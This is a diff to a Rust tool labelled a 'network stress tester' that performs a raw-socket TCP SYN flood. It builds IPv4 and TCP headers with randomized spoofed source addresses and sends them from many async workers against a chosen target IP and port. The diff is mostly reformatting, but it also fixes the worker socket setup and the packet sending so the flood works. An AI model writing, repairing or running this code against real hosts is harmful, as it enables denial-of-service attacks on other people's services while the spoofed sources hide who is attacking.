@@ -4,7 +4,7 @@ use inquire::{Select, Text};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::ipv4::{Ipv4Flags, MutableIpv4Packet};
 use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
-use pnet::transport::{transport_channel, TransportChannelType, TransportProtocol};
+use pnet::transport::{TransportChannelType, TransportProtocol, transport_channel};
 use rand::prelude::*;
 use std::fmt::Display;
 use std::net::{IpAddr, Ipv4Addr};
@@ -46,9 +46,7 @@ async fn main() -> Result<()> {
 
 fn print_banner() {
     let thanh_tieu_de = "=".repeat(50).bright_blue();
-    let content = "🚀 NETWORK STRESS TESTER (L3/L4) 🚀"
-        .bold()
-        .bright_white();
+    let content = "🚀 NETWORK STRESS TESTER (L3/L4) 🚀".bold().bright_white();
     println!("{}", thanh_tieu_de);
     println!("{}", content);
     println!("{}", thanh_tieu_de);
@@ -120,9 +118,12 @@ async fn run_syn_flood(attack_type: AttackType) -> anyhow::Result<()> {
 
     println!(
         "\n{}",
-        format!("🔥 Launching L3 SYN flood on {}:{}...", target_ip, target_port)
-            .bold()
-            .red()
+        format!(
+            "🔥 Launching L3 SYN flood on {}:{}...",
+            target_ip, target_port
+        )
+        .bold()
+        .red()
     );
     println!(
         "{}",
@@ -132,28 +133,34 @@ async fn run_syn_flood(attack_type: AttackType) -> anyhow::Result<()> {
 
     // Protocol: L3 (IPv4) but focused on TCP
     let protocol = TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp);
-    
+
     // Check if we can open raw socket
     {
-        let _ = transport_channel(4096, protocol).context(
-            "Failed L3 channel. Run with sudo!",
-        )?;
+        let _ = transport_channel(4096, protocol).context("Failed L3 channel. Run with sudo!")?;
     }
 
     for _ in 0..workers {
         let sent_counter = Arc::clone(&total_sent);
         let fail_counter = Arc::clone(&total_fail);
-        let mut tx_worker = transport_channel(4096, protocol).context("Failed worker")?.0;
 
         tokio::spawn(async move {
             let mut rng = rand::rng();
-            // IP Header (20) + TCP Header (20) = 40 bytes
+            let protocol = TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp);
+            let mut tx_worker = match transport_channel(4096, protocol) {
+                Ok((tx, _)) => tx,
+                Err(_) => {
+                    fail_counter.fetch_add(1, Ordering::Relaxed);
+                    return;
+                }
+            };
+
             let mut packet_buffer = [0u8; 40];
 
             loop {
-                let source_ip = Ipv4Addr::new(rng.random(), rng.random(), rng.random(), rng.random());
+                let source_ip =
+                    Ipv4Addr::new(rng.random(), rng.random(), rng.random(), rng.random());
 
-                // 1. Build IPv4 Header
+                // 1. Build IPv4 Header (20 bytes)
                 {
                     let mut ip_packet = MutableIpv4Packet::new(&mut packet_buffer).unwrap();
                     ip_packet.set_version(4);
@@ -168,7 +175,7 @@ async fn run_syn_flood(attack_type: AttackType) -> anyhow::Result<()> {
                     ip_packet.set_checksum(pnet::packet::ipv4::checksum(&ip_packet.to_immutable()));
                 }
 
-                // 2. Build TCP Header inside the payload of IPv4
+                // 2. Build TCP Header (20 bytes) - starts at offset 20
                 {
                     let mut tcp_packet = MutableTcpPacket::new(&mut packet_buffer[20..]).unwrap();
                     tcp_packet.set_source(rng.random());
@@ -180,14 +187,19 @@ async fn run_syn_flood(attack_type: AttackType) -> anyhow::Result<()> {
                     tcp_packet.set_window(64240);
                     tcp_packet.set_checksum(0);
 
-                    // TCP Checksum requires a pseudo-header with Source/Dest IP
-                    let checksum = pnet::packet::tcp::ipv4_checksum(&tcp_packet.to_immutable(), &source_ip, &target_ip);
+                    let checksum = pnet::packet::tcp::ipv4_checksum(
+                        &tcp_packet.to_immutable(),
+                        &source_ip,
+                        &target_ip,
+                    );
                     tcp_packet.set_checksum(checksum);
                 }
 
-                // In Layer3 channel, pnet expects the packet starting from IP header
-                use pnet::packet::tcp::TcpPacket;
-                match tx_worker.send_to(TcpPacket::new(&packet_buffer[20..]).unwrap(), IpAddr::V4(target_ip)) {
+                // In Layer3 channel, we MUST send the entire buffer (IP + TCP)
+                match tx_worker.send_to(
+                    pnet::packet::ipv4::Ipv4Packet::new(&packet_buffer).unwrap(),
+                    IpAddr::V4(target_ip),
+                ) {
                     Ok(_) => {
                         sent_counter.fetch_add(1, Ordering::Relaxed);
                     }
